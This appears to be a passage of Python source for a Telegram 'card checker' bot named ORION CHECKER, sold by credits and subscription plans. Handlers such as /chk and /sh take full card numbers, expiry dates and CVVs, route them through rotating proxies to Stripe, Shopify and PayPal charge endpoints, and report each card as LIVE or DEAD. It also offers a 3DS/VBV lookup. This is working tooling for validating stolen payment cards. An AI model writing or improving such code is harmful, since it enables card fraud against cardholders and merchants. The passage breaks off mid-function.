async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    text = (
        "🔎━━ 3DS Look UP ━━💳\n\n"
        "• CMD   : <code>/vbv &lt;card|mm|yy|cvv&gt;</code>\n"
        "• Status  : <i>Active ✅</i>\n"
        "• Gateway : <i>3DS / VBV</i>\n"
        "✦═════════════════✦"
    )
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])
    
    try:
        await q.edit_message_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending new: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

# === BASIC COMMANDS ===
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_data = get_user(user.id)
        
        # Auto-update plan if needed
        if user_data:
            credits = int(user_data.get("credits", 0))
            plan, status, duration = get_plan_from_credits(credits)
            plan_expiry = get_plan_expiry(duration)
            
            # Update if plan changed
            if user_data.get('plan') != plan:
                update_user(
                    user.id,
                    credits=credits,
                    plan=plan,
                    status=status,
                    plan_expiry=plan_expiry
                )
                user_data = get_user(user.id)  # Refresh data
        
        first_name = escape_markdown_v2(user.first_name or 'N/A')
        user_id_text = escape_markdown_v2(str(user.id))
        username = escape_markdown_v2(user.username or 'N/A')
        
        if user_data:
            status = escape_markdown_v2(user_data.get('status', 'N/A'))
            credits = escape_markdown_v2(str(user_data.get('credits', 0)))
            plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
            plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
            keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
            registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))
        else:
            status = "Free"
            credits = "0"
            plan = "Free"
            plan_expiry = "N/A"
            keys_redeemed = "0"
            registered_at = "N/A"
        
        info_message = (
            "🔍 *Your Info on ORION CHECKER ✘* ⚡\n"
            "━━━━━━━━━━━━━━\n"
            f"• First Name: `{first_name}`\n"
            f"• ID: `{user_id_text}`\n"
            f"• Username: {username}\n\n"
            f"• Status: `{status}`\n"
            f"• Credits: `{credits}`\n"
            f"• Plan: `{plan}`\n"
            f"• Plan Expiry: `{plan_expiry}`\n"
            f"• Keys Redeemed: `{keys_redeemed}`\n"
            f"• Registered At: `{registered_at}`\n"
            "\n📊 *Plan Requirements:*\n"
            "• Free: < 300 credits\n"
            "• Starter: ≥ 300 credits (7 Days)\n"
            "• Premium: ≥ 1000 credits (30 Days)\n"
            "• Plus: ≥ 2000 credits (60 Days)\n"
            "• Custom: ≥ 3000 credits (90 Days)"
        )
        
        await update.message.reply_text(info_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in /info command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching your information.")

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_data = get_user(user.id)
        
        # Auto-update plan if needed
        if user_data:
            credits = int(user_data.get("credits", 0))
            plan, status, duration = get_plan_from_credits(credits)
            plan_expiry = get_plan_expiry(duration)
            
            if user_data.get('plan') != plan:
                update_user(
                    user.id,
                    credits=credits,
                    plan=plan,
                    status=status,
                    plan_expiry=plan_expiry
                )
        
        if user_data:
            credits = str(user_data.get('credits', 0))
            plan = user_data.get('plan', 'N/A')
            status = user_data.get('status', 'N/A')
            plan_expiry = user_data.get('plan_expiry', 'N/A')
        else:
            credits = "0"
            plan = "Free"
            status = "Free"
            plan_expiry = "N/A"
        
        username = f"@{user.username}" if user.username else "N/A"
        
        escaped_username = escape_markdown_v2(username)
        escaped_user_id = escape_markdown_v2(str(user.id))
        escaped_plan = escape_markdown_v2(plan)
        escaped_status = escape_markdown_v2(status)
        escaped_credits = escape_markdown_v2(credits)
        escaped_expiry = escape_markdown_v2(plan_expiry)
        
        credit_message = (
            f"💳 *Your Credit Info* 💳\n"
            f"✦━━━━━━━━━━━━━━✦\n"
            f"• Username: {escaped_username}\n"
            f"• User ID: `{escaped_user_id}`\n"
            f"• Status: `{escaped_status}`\n"
            f"• Plan: `{escaped_plan}`\n"
            f"• Credits: `{escaped_credits}`\n"
            f"• Plan Expiry: `{escaped_expiry}`\n"
            f"\n📊 *Next Plan Upgrade:*\n"
        )
        
        # Add next upgrade info
        current_credits = int(credits)
        if current_credits < 300:
            needed = 300 - current_credits
            credit_message += f"• Starter Plan: Need `{needed}` more credits"
        elif current_credits < 1000:
            needed = 1000 - current_credits
            credit_message += f"• Premium Plan: Need `{needed}` more credits"
        elif current_credits < 2000:
            needed = 2000 - current_credits
            credit_message += f"• Plus Plan: Need `{needed}` more credits"
        elif current_credits < 3000:
            needed = 3000 - current_credits
            credit_message += f"• Custom Plan: Need `{needed}` more credits"
        else:
            credit_message += "• You have the highest plan!"
        
        await update.message.reply_text(credit_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in /credits command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching your credits.")

# === ADMIN COMMANDS ===
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show admin commands menu"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    try:
        admin_message = (
            "⚡ *ADMIN PANEL* ⚡\n"
            "✦━━━━━━━━━━━━━━✦\n\n"
            "👤 *User Management:*\n"
            "• `/adcr [user_id] [credits]` - Add credits\n"
            "• `/ban [user_id] [reason]` - Ban user\n"
            "• `/unban [user_id]` - Unban user\n"
            "• `/adduser [user_id] [credits]` - Add new user\n\n"
            
            "📊 *Statistics:*\n"
            "• `/stats` - Bot statistics\n"
            "• `/topusers` - Top 10 users\n"
            "• `/allusers` - List all users\n\n"
            
            "🔧 *Bot Control:*\n"
            "• `/close [command]` - Close command\n"
            "• `/restart [command]` - Restart command\n"
            "• `/broadcast [message]` - Broadcast to all users\n"
            "• `/backup` - Backup database\n\n"
            
            "🎫 *Redeem Codes:*\n"
            "• `/gencode [credits] [expiry_days]` - Generate code\n"
            "• `/listcodes` - List active codes\n\n"
            
            "📈 *Plan Management:*\n"
            "• Users automatically upgrade based on credits\n"
            "• Free: < 300 credits\n"
            "• Starter: ≥ 300 credits (7 Days)\n"
            "• Premium: ≥ 1000 credits (30 Days)\n"
            "• Plus: ≥ 2000 credits (60 Days)\n"
            "• Custom: ≥ 3000 credits (90 Days)"
        )
        
        await update.message.reply_text(admin_message, parse_mode=None)
    except Exception as e:
        logger.error(f"Error in /admin command: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def close_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /close <command>")
        return
    
    closed_commands.add(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now closed.")

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /restart <command>")
        return
    
    closed_commands.discard(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now available.")

async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add credits and auto-upgrade plan"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not allowed to use this command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: /adcr [user_id] [no. of credits]")
        return
    
    try:
        user_id = int(context.args[0])
        credits_to_add = int(context.args[1])
        
        if credits_to_add <= 0:
            await update.message.reply_text("❌ The number of credits must be positive.")
            return
        
        # Use the updated function that auto-upgrades plan
        new_credits = add_credits_to_user(user_id, credits_to_add)
        
        if new_credits is not None:
            # Get updated user data
            user_data = get_user(user_id)
            plan = user_data.get('plan', 'Free') if user_data else 'Free'
            status = user_data.get('status', 'Free') if user_data else 'Free'
            expiry = user_data.get('plan_expiry', 'N/A') if user_data else 'N/A'
            
            await update.message.reply_text(
                f"✅ *Credits Added Successfully!*\n\n"
                f"👤 User ID: `{user_id}`\n"
                f"💰 Credits Added: `{credits_to_add}`\n"
                f"💳 New Balance: `{new_credits}`\n"
                f"📋 New Plan: `{plan}`\n"
                f"🎯 New Status: <code>{status}</code>\n"
                f"📅 Plan Expiry: <code>{expiry}</code>\n\n"
                f"<b>Auto-upgrade applied based on credits.</b>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("❌ Failed to add credits.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or credit amount.")
    except Exception as e:
        logger.error(f"Error in /adcr command: {e}")
        await update.message.reply_text("❌ An error occurred while adding credits.")

async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a new user manually"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: /adduser [user_id] [initial_credits]")
        return
    
    try:
        user_id = int(context.args[0])
        initial_credits = int(context.args[1])
        
        if initial_credits < 0:
            await update.message.reply_text("❌ Credits cannot be negative.")
            return
        
        # Check if user already exists
        existing_user = get_user(user_id)
        if existing_user:
            await update.message.reply_text(f"❌ User {user_id} already exists!")
            return
        
        # Create new user
        from db import create_user
        success = create_user(user_id, credits=initial_credits)
        
        if success:
            # Auto-update plan
            plan, status, duration = get_plan_from_credits(initial_credits)
            plan_expiry = get_plan_expiry(duration)
            
            update_user(
                user_id,
                plan=plan,
                status=status,
                plan_expiry=plan_expiry
            )
            
            await update.message.reply_text(
                f"✅ *User Added Successfully!*\n\n"
                f"👤 User ID: `{user_id}`\n"
                f"💰 Initial Credits: `{initial_credits}`\n"
                f"📋 Plan: <code>{plan}</code>\n"
                f"🎯 Status: <code>{status}</code>\n"
                f"📅 Plan Expiry: <code>{plan_expiry}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("❌ Failed to add user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or credit amount.")
    except Exception as e:
        logger.error(f"Error in /adduser command: {e}")
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: /ban [user_id] [reason]")
        return
    
    try:
        user_id = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
        
        # Check if user exists
        user_data = get_user(user_id)
        if not user_data:
            await update.message.reply_text(f"❌ User {user_id} not found!")
            return
        
        # Ban the user
        update_user(user_id, is_banned=1, ban_reason=reason)
        
        await update.message.reply_text(
            f"✅ *User Banned Successfully!*\n\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"📛 Reason: <code>{reason}</code>\n"
            f"⏰ Banned at: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode='HTML'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
    except Exception as e:
        logger.error(f"Error in /ban command: {e}")
        await update.message.reply_text("❌ An error occurred while banning user.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /unban [user_id]")
        return
    
    try:
        user_id = int(context.args[0])
        
        # Check if user exists
        user_data = get_user(user_id)
        if not user_data:
            await update.message.reply_text(f"❌ User {user_id} not found!")
            return
        
        # Unban the user
        update_user(user_id, is_banned=0, ban_reason="")
        
        await update.message.reply_text(
            f"✅ <b>User Unbanned Successfully!</b>\n\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"⏰ Unbanned at: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode='HTML'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
    except Exception as e:
        logger.error(f"Error in /unban command: {e}")
        await update.message.reply_text("❌ An error occurred while unbanning user.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    try:
        # Get database stats
        db_stats = get_database_stats()
        
        # Get top users
        top_users = get_top_users(5)
        
        stats_message = (
            "📊 *BOT STATISTICS* 📊\n"
            "✦━━━━━━━━━━━━━━✦\n\n"
            f"👥 Total Users: `{db_stats.get('total_users', 0)}`\n"
            f"💰 Total Credits: `{db_stats.get('total_credits', 0)}`\n\n"
            
            "📋 *Plan Distribution:*\n"
        )
        
        # Add plan distribution
        plan_dist = db_stats.get('plan_distribution', {})
        for plan, count in plan_dist.items():
            stats_message += f"• {plan}: `{count}` users\n"
        
        stats_message += "\n🏆 *Top 5 Users:*\n"
        
        # Add top users
        for i, user in enumerate(top_users, 1):
            username = user.get('username', 'N/A')
            if username == 'N/A' or not username:
                username = f"User {user.get('user_id')}"
            else:
                username = f"@{username}"
            
            stats_message += (
                f"{i}. {username} - "
                f"`{user.get('credits', 0)}` credits "
                f"({user.get('plan', 'Free')})\n"
            )
        
        stats_message += f"\n⏰ Last Updated: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        
        await update.message.reply_text(stats_message, parse_mode=None)
    except Exception as e:
        logger.error(f"Error in /stats command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching statistics.")

async def topusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show top users"""
    try:
        # Get top users
        top_users = get_top_users(10)
        
        if not top_users:
            await update.message.reply_text("📭 No users found!")
            return
        
        top_message = "🏆 *TOP 10 USERS* 🏆\n✦━━━━━━━━━━━━━━✦\n\n"
        
        for i, user in enumerate(top_users, 1):
            username = user.get('username', 'N/A')
            if username == 'N/A' or not username:
                username = f"User {user.get('user_id')}"
            else:
                username = f"@{username}"
            
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            
            top_message += (
                f"{medal} {username}\n"
                f"   └─ Credits: `{user.get('credits', 0)}` | "
                f"Plan: `{user.get('plan', 'Free')}`\n\n"
            )
        
        await update.message.reply_text(top_message, parse_mode=None)
    except Exception as e:
        logger.error(f"Error in /topusers command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching top users.")

async def allusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    try:
        users = get_all_users(limit=50)
        
        if not users:
            await update.message.reply_text("📭 No users found!")
            return
        
        users_message = "👥 *ALL USERS* 👥\n✦━━━━━━━━━━━━━━✦\n\n"
        
        for i, user in enumerate(users, 1):
            username = user.get('username', 'N/A')
            if username == 'N/A' or not username:
                username = f"User {user.get('user_id')}"
            else:
                username = f"@{username}"
            
            users_message += (
                f"{i}. {username} (ID: `{user.get('user_id')}`)\n"
                f"   └─ Credits: `{user.get('credits', 0)}` | "
                f"Plan: `{user.get('plan', 'Free')}` | "
                f"Joined: `{user.get('registered_at', 'N/A')}`\n\n"
            )
        
        users_message += f"📊 Total Users: `{len(users)}`"
        
        await update.message.reply_text(users_message, parse_mode=None)
    except Exception as e:
        logger.error(f"Error in /allusers command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching users.")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /broadcast [message]")
        return
    
    try:
        message = " ".join(context.args)
        users = get_all_users(limit=1000)  # Get all users
        
        if not users:
            await update.message.reply_text("📭 No users to broadcast to!")
            return
        
        await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
        
        success_count = 0
        fail_count = 0
        
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"📢 <b>BROADCAST MESSAGE</b>\n\n{message}",
                    parse_mode=ParseMode.HTML
                )
                success_count += 1
                await asyncio.sleep(0.1)  # Rate limiting
            except Exception as e:
                logger.error(f"Failed to send broadcast to {user['user_id']}: {e}")
                fail_count += 1
        
        await update.message.reply_text(
            f"✅ *Broadcast Complete!*\n\n"
            f"📨 Sent: <code>{success_count}</code>\n"
            f"❌ Failed: <code>{fail_count}</code>\n"
            f"📊 Total: <code>{len(users)}</code>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error in /broadcast command: {e}")
        await update.message.reply_text("❌ An error occurred while broadcasting.")

async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Backup database"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    try:
        backup_file = backup_database()
        
        if backup_file:
            await update.message.reply_text(
                f"✅ <b>Database Backup Created!</b>\n\n"
                f"📁 File: <code>{backup_file}</code>\n"
                f"⏰ Time: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
                parse_mode='HTML'
            )
            
            # Send the backup file
            with open(backup_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=backup_file,
                    caption=f"Database Backup: {backup_file}"
                )
        else:
            await update.message.reply_text("❌ Failed to create backup!")
    except Exception as e:
        logger.error(f"Error in /backup command: {e}")
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")

async def gencode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate redeem code"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: /gencode [credits] [expiry_days=30]")
        return
    
    try:
        credits = int(context.args[0])
        expiry_days = int(context.args[1]) if len(context.args) > 1 else 30
        
        if credits <= 0:
            await update.message.reply_text("❌ Credits must be positive.")
            return
        
        # Generate random code
        import string
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        # Create redeem code
        success = create_redeem_code(code, credits, expiry_days)
        
        if success:
            await update.message.reply_text(
                f"✅ *Redeem Code Generated!*\n\n"
                f"🎫 Code: `{code}`\n"
                f"💰 Credits: `{credits}`\n"
                f"📅 Expiry: <code>{expiry_days}</code> days\n"
                f"⏰ Created: <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
                f"📝 <b>Usage:</b> <code>/redeem {code}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("❌ Failed to generate code. It may already exist.")
    except ValueError:
        await update.message.reply_text("❌ Invalid credits or expiry days.")
    except Exception as e:
        logger.error(f"Error in /gencode command: {e}")
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")

async def listcodes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List active redeem codes"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    
    try:
        codes = get_active_redeem_codes()
        
        if not codes:
            await update.message.reply_text("📭 No active redeem codes!")
            return
        
        codes_message = "🎫 *ACTIVE REDEEM CODES* 🎫\n✦━━━━━━━━━━━━━━✦\n\n"
        
        for i, code in enumerate(codes, 1):
            codes_message += (
                f"{i}. Code: `{code['code']}`\n"
                f"   └─ Credits: `{code['credits']}` | "
                f"Created: `{code['created_at']}` | "
                f"Expires: `{code['expires_at']}`\n\n"
            )
        
        codes_message += f"📊 Total Codes: `{len(codes)}`"
        
        await update.message.reply_text(codes_message, parse_mode=None)
    except Exception as e:
        logger.error(f"Error in /listcodes command: {e}")
        await update.message.reply_text("❌ An error occurred while fetching codes.")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a code"""
    try:
        user = update.effective_user
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /redeem [code]")
            return
        
        code = context.args[0].strip().upper()
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        # Use the redeem code
        new_credits, message = use_redeem_code(code, user.id)
        
        if new_credits:
            # Auto-update plan
            plan, status, duration = get_plan_from_credits(new_credits)
            plan_expiry = get_plan_expiry(duration)
            
            update_user(
                user.id,
                plan=plan,
                status=status,
                plan_expiry=plan_expiry
            )
            
            await update.message.reply_text(
                f"✅ *Code Redeemed Successfully!*\n\n"
                f"🎫 Code: `{code}`\n"
                f"💰 Credits Added: `{new_credits - user_data.get('credits', 0) if user_data else new_credits}`\n"
                f"💳 New Balance: `{new_credits}`\n"
                f"📋 New Plan: <code>{plan}</code>\n"
                f"🎯 New Status: <code>{status}</code>\n"
                f"📅 Plan Expiry: <code>{plan_expiry}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(f"❌ {message}")
    except Exception as e:
        logger.error(f"Error in /redeem command: {e}")
        await update.message.reply_text("❌ An error occurred while redeeming code.")

# === PAYMENT GATEWAY COMMANDS ===
async def check_stripe_api(card, mm, yy, cvv, gateway_type="stripe_auth"):
    """Check card via Stripe Gateway with proxy support"""
    try:
        mm = mm.zfill(2)
        yy = yy[-2:] if len(yy) == 4 else yy
        
        # Select endpoint based on gateway type
        if gateway_type == "stripe_auth":
            url = STRIPE_AUTH_API
            amount = 50
            proxy_key = "stripe_auth"
        elif gateway_type == "stripe_charge_1":
            url = STRIPE_CHARGE_1_API
            amount = 100
            proxy_key = "stripe_charge_1"
        elif gateway_type == "stripe_charge_3":
            url = STRIPE_CHARGE_3_API
            amount = 300
            proxy_key = "stripe_charge_3"
        else:
            url = STRIPE_AUTH_API
            amount = 50
            proxy_key = "stripe_auth"
        
        # Get proxy for this request
        proxy_url = get_proxy(proxy_key)
        
        async with aiohttp.ClientSession() as session:
            payload = {
                "card": {
                    "number": card,
                    "exp_month": mm,
                    "exp_year": yy,
                    "cvc": cvv
                },
                "amount": amount,
                "currency": "usd"
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {GATEWAY_API_KEY}",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with session.post(
                url,
                json=payload,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                
                text = await response.text()
                logger.info(f"Stripe API Response ({gateway_type}): {text[:200]}")
                
                if response.status == 200:
                    try:
                        data = json.loads(text)
                        
                        # Check for success
                        success_indicators = ['approved', 'success', 'succeeded', 'live']
                        if any(indicator in str(data).lower() for indicator in success_indicators):
                            return "approved", data
                        
                        # Check for soft decline
                        error_msg = str(data.get('message', '') + str(data.get('error', ''))).lower()
                        soft_errors = ['cvv', 'cvc', 'zip', 'address', 'security']
                        
                        if any(soft_err in error_msg for soft_err in soft_errors):
                            return "approved_with_warning", data
                            
                        return "declined", data
                    except:
                        if any(word in text.lower() for word in ['approved', 'success']):
                            return "approved", text
                        else:
                            return "declined", text
                else:
                    return "error", text
                    
    except Exception as e:
        logger.error(f"Stripe API error ({gateway_type}): {e}")
        return "error", str(e)

async def check_shopify_api(card, mm, yy, cvv, amount_type="098"):
    """Check card via Shopify Gateway"""
    try:
        mm = mm.zfill(2)
        yy = yy if len(yy) == 4 else f"20{yy}"
        
        # Select endpoint based on amount
        if amount_type == "098":
            url = SHOPIFY_CHARGE_098_API
            amount = 0.98
            proxy_key = "shopify_098"
        elif amount_type == "1":
            url = SHOPIFY_CHARGE_1_API
            amount = 1.00
            proxy_key = "shopify_1"
        elif amount_type == "10":
            url = SHOPIFY_CHARGE_10_API
            amount = 10.00
            proxy_key = "shopify_10"
        else:
            url = SHOPIFY_CHARGE_098_API
            amount = 0.98
            proxy_key = "shopify_098"
        
        # Get proxy
        proxy_url = get_proxy(proxy_key)
        
        async with aiohttp.ClientSession() as session:
            payload = {
                "card": {
                    "number": card,
                    "exp_month": mm,
                    "exp_year": yy,
                    "cvc": cvv
                },
                "amount": amount,
                "currency": "usd"
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {GATEWAY_API_KEY}"
            }
            
            async with session.post(
                url,
                json=payload,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                
                text = await response.text()
                
                if response.status == 200:
                    try:
                        data = json.loads(text)
                        if data.get('success') or 'approved' in str(data).lower():
                            return "approved", data
                        else:
                            return "declined", data
                    except:
                        if 'approved' in text.lower():
                            return "approved", text
                        else:
                            return "declined", text
                else:
                    return "error", text
                    
    except Exception as e:
        logger.error(f"Shopify API error: {e}")
        return "error", str(e)

async def check_paypal_api(card, mm, yy, cvv, amount_type="9"):
    """Check card via PayPal Gateway"""
    try:
        mm = mm.zfill(2)
        yy = yy if len(yy) == 4 else yy
        
        # Select endpoint
        if amount_type == "9":
            url = PAYPAL_CHARGE_9_API
            amount = 9.00
            proxy_key = "paypal_9"
        else:
            url = PAYPAL_CHARGE_1_API
            amount = 1.00
            proxy_key = "paypal_1"
        
        # Get proxy
        proxy_url = get_proxy(proxy_key)
        
        async with aiohttp.ClientSession() as session:
            payload = {
                "card": {
                    "number": card,
                    "exp_month": mm,
                    "exp_year": yy,
                    "cvc": cvv
                },
                "amount": amount,
                "currency": "usd"
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {GATEWAY_API_KEY}"
            }
            
            async with session.post(
                url,
                json=payload,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as response:
                
                text = await response.text()
                
                if response.status == 200:
                    if 'approved' in text.lower() or 'success' in text.lower():
                        return "approved", text
                    else:
                        return "declined", text
                else:
                    return "error", text
                    
    except Exception as e:
        logger.error(f"PayPal API error: {e}")
        return "error", str(e)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Auth checker"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /chk card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Checking with Stripe API...")
        
        status, response = await check_stripe_api(card, mm, yy, cvv, gateway_type="stripe_auth")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *STRIPE AUTH SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"🎯 Status: <code>LIVE ✅</code>\n"
                f"🔧 Gateway: Stripe Auth\n"
                f"💵 Type: Auth Only (No Charge)",
                parse_mode='HTML'
            )
        elif status == "approved_with_warning":
            await msg.edit_text(
                f"⚠️ <b>STRIPE AUTH WARNING</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"📅 Exp: <code>{mm}/{yy}</code>\n"
                f"🎯 Status: <code>LIVE ⚠️</code>\n"
                f"📝 Note: Card valid but CVV/Address mismatch\n"
                f"🔧 Gateway: Stripe Auth\n"
                f"💵 Type: Auth Only (No Charge)",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>STRIPE AUTH DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DEAD ❌</code>\n"
                f"🔧 Gateway: Stripe Auth\n"
                f"💵 Type: Auth Only (No Charge)",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /chk command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify 0.98$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /sh card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 0.98$ with Shopify...")
        
        status, response = await check_shopify_api(card, mm, yy, cvv, amount_type="098")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *SHOPIFY CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
